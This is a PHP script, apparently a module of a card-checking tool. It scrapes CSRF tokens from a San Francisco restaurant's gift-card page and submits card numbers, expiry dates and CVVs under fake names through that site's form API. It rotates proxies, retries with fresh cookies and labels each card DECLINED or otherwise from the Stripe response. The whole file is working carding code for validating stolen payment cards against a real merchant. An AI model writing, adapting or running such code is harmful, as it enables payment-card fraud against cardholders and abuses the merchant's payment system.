<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.fablesf.com/gift-cards', null, $cookie, $server['proxy']);

if (!$r1->success) {
	$empty = ''.$r1->error.'! ('.intval($r1->errno).')';

	goto start;
}

$crumb = $this->getstr(json_encode($r1), 'crumb=', ';');

$formId = $this->getstr($r1->body, "formId: '", "'");

$collectionId = $this->getstr($r1->body, "collectionId: '", "'");

$objectName = $this->getstr($r1->body, "objectName: '", "'");

if (empty($crumb) || empty($formId) || empty($collectionId) || empty($objectName)) {
	$empty = 'First Request Tokens are Empty';

	goto start;
}

$data = '{}';

$headers = [
	'authority: www.fablesf.com',
	'accept: application/json, text/plain, */*',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json;charset=UTF-8',
	'origin: https://www.fablesf.com',
	'referer: https://www.fablesf.com/gift-cards',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-csrf-token: '.$crumb.''
];

$r2 = $this->curlx->Post('https://www.fablesf.com/api/form/FormSubmissionKey', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

$key = $this->getstr($r2->body, '"key":"', '"');

if (empty($key)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = '{"key":"'.$key.'","formId":"'.$formId.'","collectionId":"'.$collectionId.'","objectName":"'.$objectName.'","form":"{\"currency-yui_3_17_2_1_1585074175469_11976\":\"1\",\"name-yui_3_17_2_1_1585074175469_27532\":[\"\",\"\"],\"address-yui_3_17_2_1_1585074175469_9930\":[\"\",\"\",\"\",\"\",\"\",\"\"],\"text-yui_3_17_2_1_1585074175469_28671\":\"\",\"name-yui_3_17_2_1_1553888888520_3744\":[\"'.$fake->first.'\",\"'.$fake->last.'\"],\"number-yui_3_17_2_1_1585074175469_12808\":\"'.$cc.'\",\"text-yui_3_17_2_1_1585846540146_62454\":\"'.$mm.'/'.$yy.'\",\"number-yui_3_17_2_1_1585074175469_49530\":\"'.$cvv.'\",\"phone-yui_3_17_2_1_1585074175469_11148\":[\"\",\"256\",\"345\",\"7654\"]}","pagePermissionTypeValue":1,"pageTitle":"GIFT CARDS","pageId":"'.$collectionId.'","contentSource":"c","pagePath":"/gift-cards"}';

$headers = [
	'authority: www.fablesf.com',
	'accept: application/json, text/plain, */*',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json;charset=UTF-8',
	'origin: https://www.fablesf.com',
	'referer: https://www.fablesf.com/gift-cards',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-csrf-token: '.$crumb.''
];

$r3 = $this->curlx->Post('https://www.fablesf.com/api/form/SaveFormSubmission', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) {
	$empty = ''.$r3->error.'! ('.intval($r3->errno).')';

	goto start;
}

file_put_contents('uni_r3.txt', json_encode($r3));

$status = $this->response->Stripe($r3->body);

end: